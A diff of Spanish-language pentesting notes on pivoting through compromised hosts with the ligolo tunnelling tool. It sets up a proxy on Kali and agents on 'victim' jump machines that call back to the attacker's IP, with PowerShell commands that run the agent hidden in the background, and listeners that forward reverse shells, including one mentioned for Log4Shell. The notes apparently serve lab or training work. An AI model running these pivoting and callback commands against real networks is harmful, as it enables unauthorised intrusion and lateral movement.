@@ -67,31 +67,7 @@ del proceso:
 
 ![[ligolo_punto_a_punto_b.png]]
 
-
-## 1: Conectar Kali al Punto A
-
-```bash 
-PASO 1: 
-❯ ./proxy -selfcert -laddr 0.0.0.0:11601      # Ejecutar el proxy en Kali con permisos de ejecución
-	❯ interface_create --name ligolo          # Crear la interfaz
-	❯ interface_add_route --name ligolo --route IP.0/24    
-	# Agregar el segmento al cual se quiere llegar 
-
-PASO 2: 
-❯ chmod +x agent   # Permisos de ejecución 
-❯ ./agent -connect IP_Kali:11601 -ignore-cert       
-# Ejecutar el agente en la máquina víctima en el 'salto' con permisos de ejecución en el dir '/tmp'
-	# IP = Direción IP de Kali
-	# Port = Puerto en donde esta escuchando ligolo al ejecutar el proxy 
-
-
-PASO 3:
-# Una vez que en Kali muestre 'Agent join', dar 'Enter' para ingresar a la consola interactiva de ligolo
-❯ session         # Mostrar las sesiones activas, seleccionar la sesión 1 y dar 'Enter'
-❯ tunnel_start --tun ligolo   # Iniciar el tunelizado al segmento de red  
-```
-
-### 2: Conectar Kali al Punto B por medio del Punto A  con un agente
+## 1: Conectar Kali al Punto B por medio del Punto A  con un agente
 
 ```bash 
 # Descargar agente y proxy 
@@ -105,11 +81,14 @@ PASO 1:
 
 
 PASO 2: 
+# Desde Linux 
 ❯ chmod +x agent   # Permisos de ejecución 
 ❯ ./agent -connect IP_Kali:11601 -ignore-cert       
 # Ejecutar el agente en la máquina víctima en el 'salto' con permisos de ejecución en el dir '/tmp'
-	# IP = Direción IP de Kali
-	# Port = Puerto en donde esta escuchando ligolo al ejecutar el proxy 
+
+# Desde Windows Powershell (Colocarlo en segundo plano)
+❯ .\agent_win.exe -connect IP_kali:11601 -ignore-cert
+❯ Start-Process powershell -ArgumentList "-NoExit", "-Command", "cd $env:TEMP; .\agent.exe -connect IP_Kali:11601 -ignore-cert"
 
 
 PASO 3:
@@ -130,23 +109,17 @@ PASO 4: # Esto es para la vulne Log4Shell
 
 # Si se necesita una segunda revershell crear otro listener 
 ❯ listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp  # Revershell 2
+
+
+PASO 5:
+# Al terminar eliminar la configuración 
+❯ listener_stop
+❯ tunnel_stop
+❯ interface_delete --name ligolo
 ```
 
-```bash 
-PASO 1:  # Interfaz modo manual 
-❯ ip tuntap add user $USER mode tun ligolo       # Crear una interface de red llamada 'ligolo' en modo tunel en Kali
-❯ ip link set ligolo up 
-❯ ip route add IP.0/24 dev ligolo                # Agregar el segmento al cual se quiere llegar 
-	# dev = Dispositivo llamado 'ligolo'
 
-PASO 2: 
-# Al terminar eliminar las rutas y la interfaz 'ligolo' en Kali 
-❯ ip route del IP.0/24 dev ligolo    # Eliminar la ruta de la tabla de ruteo 
-❯ ip link del ligolo                 # Eliminar la interface llamada 'ligolo'
-❯ ip route list                      # Mirar la tabla de enrutamiento 
-```
-
-### 3: Conectar Kali al Punto Final por medio del Punto B con un agente
+## 2: Conectar Kali al Punto Final por medio del Punto B con un agente
 
 ```bash 
 # Esto funciona cuando ya se tiene un primer túnel (Punto A) y se quiere crear un segundo túnel 
